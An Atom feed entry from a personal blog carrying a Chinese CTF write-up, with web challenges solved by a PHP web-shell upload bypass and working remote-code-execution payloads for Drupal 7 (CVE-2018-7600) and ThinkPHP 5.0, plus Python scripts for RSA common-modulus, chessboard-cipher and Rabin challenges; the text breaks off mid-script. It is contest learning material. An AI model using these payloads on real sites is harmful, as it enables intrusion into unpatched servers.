<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gardenia&#39;s Blog</title>
  
  <subtitle>I am a slow walker,but I never walk backwards.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gardenia30.top/"/>
  <updated>2019-01-16T14:49:25.853Z</updated>
  <id>https://gardenia30.top/</id>
  
  <author>
    <name>Gardenia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CUMT-CTF第一次双月赛Writeup</title>
    <link href="https://gardenia30.top/2019/01/14/CUMT-CTF%E5%8F%8C%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>https://gardenia30.top/2019/01/14/CUMT-CTF双月赛Writeup/</id>
    <published>2019-01-14T07:01:43.000Z</published>
    <updated>2019-01-16T14:49:25.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知其然，知其所以然<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>题目描述是可以上传图片的，就随手上传一张图片上去<br><img src="https://s1.ax1x.com/2018/12/16/FdJD6P.png" alt=""></p><p>回显出目录结构如下：<br><img src="https://s1.ax1x.com/2018/12/16/FdJym8.png" alt=""></p><p>访问URL发现可以看到上传的图片：<br><img src="https://s1.ax1x.com/2018/12/16/FdNWfH.png" alt=""><br>知道了上传目录，现在要做的就是上传成功一个Web Shell。</p><p>连接Cknife，写了个php小马，上传发现不可以上传以php结尾的文件。</p><p>第一次抓包尝试加00截断，未果。</p><p>第二次将后缀改成1.php.abc可以成功上传，但是设置Cknife需要连接的时候发现connection：close，应该是不能将上传的1.php.abc成功解析,未果。</p><p>第三次将后缀改成php5，可以上传成功，连接Cknife，成功进入，应该这次可以将haha.php5成功解析：<br><img src="https://s1.ax1x.com/2018/12/16/Fdd9FU.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdaxe0.png" alt=""></p><p>在upload文件夹中找了半天，全都是别人上传的文件，最后在根目录发现了flag：<br><img src="https://s1.ax1x.com/2018/12/16/FddrXn.png" alt=""><br><img src="https://s1.ax1x.com/2018/12/16/Fdw8CF.png" alt=""></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞。</p><p>Google一波，看看大佬写的博客，贴个链接：</p><p><a href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-" target="_blank" rel="noopener">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p><p><a href="https://www.jianshu.com/p/7c410db788ed" target="_blank" rel="noopener">https://www.jianshu.com/p/7c410db788ed</a></p><p>先创建账号，发现不可以发送email，Google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候直接拿bp截断，构造post：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure><p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png" alt=""></p><p>保留这个form_build_id，用Hackbar post一下这个form_build_id，如下图：</p><p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png" alt=""></p><p>抓包截断，go一下回显根目录，发现flag文件，</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png" alt=""></p><p>下一步就是尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成<code>cat%20/flag</code>即可。（需要注意的是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p><p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png" alt=""></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>是个新题正好是前段时间爆出来的新漏洞：ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞，前些日子看合天公众号推送了一篇类似的文章正好派上用场：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652849500&amp;idx=1&amp;sn=faf67baccbc970a179e679ea378fdc92&amp;chksm=bd5939918a2eb087cd34eff02f4bb0186190f15dda841e299923717de222df913db1a89acb1d&amp;mpshare=1&amp;scene=23&amp;srcid=1216eedEBA61VyEXXfPPHC1R#rd" target="_blank" rel="noopener">click here</a></p><p>题目提示是tp5.0版本，文章直接有payload：</p><p><code>命令执行：</code></p><p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</code></p><p>先<code>ls /</code>列出根目录下的所有目录，发现flag文件；</p><p><a href="https://imgchr.com/i/Fxggu6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/14/Fxggu6.md.png" alt="Fxggu6.md.png"></a></p><p>然后直接查看flag文件即可：</p><p><img src="https://s2.ax1x.com/2019/01/14/FxgqDf.png" alt="FxgqDf.png"></p><p>payload:</p><p><code>http://219.219.61.234:10005/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>之前还没有认真学习过密码学的东西，好在期末好好复习了密码学，现在已经对密码学的知识有了个初步的认识，来温习一下上次的crypto</p><h3 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>拿到这题，看到<code>n,c1,c2,e1,e2</code>基本已经锁定这一题就是RSA的共模攻击，但是所给的参数全部都是字母，按理说应该都是数字才对，所以最难的工作就是将这一堆的字母转化为可用的数字；</p><p>先统计一下字母的出现频率：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_each_char_1</span><span class="params">(string)</span>:</span></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            res[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res[i] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"n:"</span>+str((count_each_char_1(n)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1:"</span>+str((count_each_char_1(c1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2:"</span>+str((count_each_char_1(c2)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e1:"</span>+str((count_each_char_1(e1)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"e2:"</span>+str((count_each_char_1(e2)))</span><br></pre></td></tr></table></figure><p><strong>Result</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n:&#123;&apos;A&apos;: 65, &apos;B&apos;: 63, &apos;E&apos;: 56, &apos;g&apos;: 52, &apos;I&apos;: 60, &apos;O&apos;: 72, &apos;S&apos;: 56, &apos;b&apos;: 62, &apos;T&apos;: 69, &apos;Z&apos;: 62&#125;</span><br><span class="line">c1:&#123;&apos;A&apos;: 55, &apos;b&apos;: 62, &apos;E&apos;: 66, &apos;g&apos;: 60, &apos;I&apos;: 67, &apos;O&apos;: 58, &apos;S&apos;: 65, &apos;B&apos;: 59, &apos;T&apos;: 53, &apos;Z&apos;: 72&#125;</span><br><span class="line">c2:&#123;&apos;A&apos;: 67, &apos;B&apos;: 61, &apos;E&apos;: 51, &apos;g&apos;: 60, &apos;I&apos;: 57, &apos;O&apos;: 63, &apos;S&apos;: 66, &apos;b&apos;: 63, &apos;T&apos;: 70, &apos;Z&apos;: 59&#125;</span><br><span class="line">e1:&#123;&apos;I&apos;: 3, &apos;Z&apos;: 1, &apos;B&apos;: 2, &apos;T&apos;: 1, &apos;g&apos;: 1&#125;</span><br><span class="line">e2:&#123;&apos;A&apos;: 1, &apos;b&apos;: 1, &apos;g&apos;: 2, &apos;I&apos;: 1, &apos;T&apos;: 1, &apos;Z&apos;: 1&#125;</span><br></pre></td></tr></table></figure><p>发现总共就出现了10个字母<code>A,B,E,g,I,O,S,b,T,Z</code>,猜想这10个字母对应的是0-9的10个数字，如何将字母和数字进行对应是个头疼的问题；想了半天，没办法，只能暴力破解，产生字母的全排列对应10个数字…</p><p><strong>暴力破解脚本</strong>(借鉴队友脚本学习了一下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">dic_alp1=[<span class="string">'O'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'b'</span>,<span class="string">'Z'</span>,<span class="string">'I'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'g'</span>]</span><br><span class="line">dic_num=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">dic_alp2=list(itertools.permutations(dic_alp1))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_alp2:</span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">n=n.replace(x[i],dic_num[i])</span><br><span class="line">c1=c1.replace(x[i],dic_num[i])</span><br><span class="line">c2=c2.replace(x[i],dic_num[i])</span><br><span class="line">e1=e1.replace(x[i],dic_num[i])</span><br><span class="line">e2=e2.replace(x[i],dic_num[i])</span><br><span class="line"></span><br><span class="line">n=int(n,<span class="number">10</span>)</span><br><span class="line">c1=int(c1,<span class="number">10</span>)</span><br><span class="line">c2=int(c2,<span class="number">10</span>)</span><br><span class="line">e1=int(e1,<span class="number">10</span>)</span><br><span class="line">e2=int(e2,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(e1,e2)!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mgcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=-s</span><br><span class="line">c1=gmpy2.invert(c1,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">t=-t</span><br><span class="line">c2=gmpy2.invert(c2,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">plain=pow(c1,s,n)*pow(c2,t,n)%n</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ans = <span class="string">'&#123;:x&#125;'</span>.format(plain).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>先用出现字母的全排列对应表0-9这10个数，然后将所有参数用数字表示，用RSA的共模攻击求出最后的结果，发现flag：</p><p><a href="https://imgchr.com/i/kS6qQ1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/16/kS6qQ1.md.png" alt="kS6qQ1.md.png"></a></p><p>最后发现是与数字形状相似的字母代替数字产生的参数…… </p><p><strong>attention：</strong>其实可以对脚本进行优化，因为<code>e1</code>和<code>e2</code>都是和<code>φ(n)</code>互素的，所以<code>e1</code>和<code>e2</code>都是奇数，所以可以缩小<code>e1</code>和<code>e2</code>的范围，最后一个数字都是奇数，即：<code>g</code>和<code>I</code>都是奇数；</p><h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>这题直接告诉是棋盘密码，比较简单，给出的密文里总共有<code>ksynb</code>5个字母，所以直接构造这5个字母的全排列对应26字母表即可，总共有5!=120种不同的结果，可以直接暴破；</p><p><strong>暴力破解脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line">cipher=<span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line">dic_cip=list(itertools.permutations(<span class="string">"ksynb"</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_cip:</span><br><span class="line">    key.append(<span class="string">''</span>.join(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child_key <span class="keyword">in</span> key:</span><br><span class="line">    num_c=<span class="string">""</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        num_c+=str(child_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(num_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii=int(num_c[i])*<span class="number">5</span>+int(num_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">"i"</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        ans+=chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> child_key,ans</span><br></pre></td></tr></table></figure><p>发现有两种结果里面有<code>flag</code>字符，显然是第一个，排列方式为<code>skynb</code>；</p><p><img src="https://s2.ax1x.com/2019/01/16/kS4Yuj.png" alt="kS4Yuj.png"></p><h3 id="First-level"><a href="#First-level" class="headerlink" title="First level"></a>First level</h3><p>题目给出<code>e=2</code>，基本已经锁定是RSA的衍生算法rabin，yafu分解n得到p和q如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line"></span><br><span class="line">ans = 1</span><br><span class="line"></span><br><span class="line">eof; done processing batchfile</span><br></pre></td></tr></table></figure><p><strong>攻击脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span 